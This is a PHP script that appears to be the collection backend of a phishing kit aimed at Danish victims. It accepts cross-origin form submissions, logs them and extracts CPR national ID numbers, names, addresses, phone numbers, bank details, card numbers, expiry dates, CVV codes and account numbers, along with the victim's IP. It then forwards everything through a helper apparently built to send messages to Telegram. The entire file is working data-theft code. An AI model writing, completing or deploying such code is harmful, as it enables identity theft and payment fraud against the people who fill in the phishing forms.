<?php
header("Content-Type: application/json; charset=utf-8");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
if (isset($_SERVER["REQUEST_METHOD"]) && $_SERVER["REQUEST_METHOD"] === "OPTIONS") {
  http_response_code(204);
  exit;
}

require_once __DIR__ . "/tg.php";

$raw = file_get_contents("php://input");
$data = json_decode($raw, true);
if (!is_array($data)) {
  http_response_code(400);
  echo json_encode(array("ok" => false, "error" => "bad json"));
  exit;
}

juj_log_event($data);

$originalText = isset($data["text"]) ? (string)$data["text"] : "";
$brugerId = isset($data["bruger_id"]) ? $data["bruger_id"] : (isset($data["username"]) ? $data["username"] : "—");
$cprNummer = isset($data["cpr"]) ? $data["cpr"] : (isset($data["cpr_nummer"]) ? $data["cpr_nummer"] : "—");
$ref = (isset($data["reference"]) && $data["reference"] !== "") ? $data["reference"] : "#CRDS59PE3";

$fwd = isset($_SERVER["HTTP_X_FORWARDED_FOR"]) ? $_SERVER["HTTP_X_FORWARDED_FOR"] : "";
$rem = isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : "";
if ($fwd !== "") {
  $parts = explode(",", $fwd);
  $ip = trim($parts[0]);
} else {
  $ip = trim($rem);
}
if ($ip === "::1" || $ip === "127.0.0.1") {
  $ip = "169.150.196.153";
}

$parsed = array();
$linesIn = preg_split("/\r\n|\n|\r/", $originalText);
foreach ($linesIn as $line) {
  $line = trim($line);
  if ($line === "" || strpos($line, ":") === false) {
    continue;
  }
  if (preg_match('/^(🔑|Ny samlet|Ref:|CPR-Number:|Bruger-ID:|IP-Adresse:|IP:)/iu', $line)) {
    continue;
  }
  $parts = explode(":", $line, 2);
  $key = trim(preg_replace('/^[^\w\/]+/u', "", $parts[0]));
  $key = trim($key);
  $val = trim($parts[1]);
  if ($key === "" || $val === "") {
    continue;
  }
  $parsed[$key] = $val;
}

$get = function ($keys, $fallback = "—") use ($parsed) {
  if (!is_array($keys)) {
    $keys = array($keys);
  }
  foreach ($keys as $k) {
    if (isset($parsed[$k]) && $parsed[$k] !== "") {
      return $parsed[$k];
    }
  }
  return $fallback;
};

$lines = array(
  "🔑 <b>Ny samlet besvarelse</b>",
  "🆔 Ref: " . $ref,
  "🪪 CPR-Number: " . $cprNummer,
  "📜 Bruger-ID: " . $brugerId,
  "🌐 IP: " . $ip,
  "",
  "🏢 Virksomhed: " . $get(array("Virksomhed")),
  "🔒 CVR: " . $get(array("CVR")),
  "🏠 CVR-adresse: " . $get(array("CVR-adresse")),
  "",
  "👤 Navn: " . $get(array("Navn")),
  "🏠 Adresse: " . $get(array("Adresse")),
  "📍 Postnr/by: " . $get(array("Postnr/by")),
  "📞 Telefonnummer: " . $get(array("Telefonnummer", "Telefon")),
  "🏦 Bank: " . $get(array("Bank")),
  "",
  "💳 Kort & Konto Detaljer",
  "👤 Kort ejernavn: " . $get(array("Kort ejernavn")),
  "💳 Kort nummer: " . $get(array("Kort nummer")),
  "📅 Udløbsdato: " . $get(array("Udløbsdato")),
  "🔒 CVV: " . $get(array("CVV")),
  "🔢 Regnr: " . $get(array("Regnr")),
  "🔢 Kontonr: " . $get(array("Kontonr")),
);

$finalText = implode("\n", $lines);
$sent = juj_tg_send($finalText, "HTML");

echo json_encode(array("ok" => $sent > 0, "sent" => $sent, "v" => "clean-layout"));
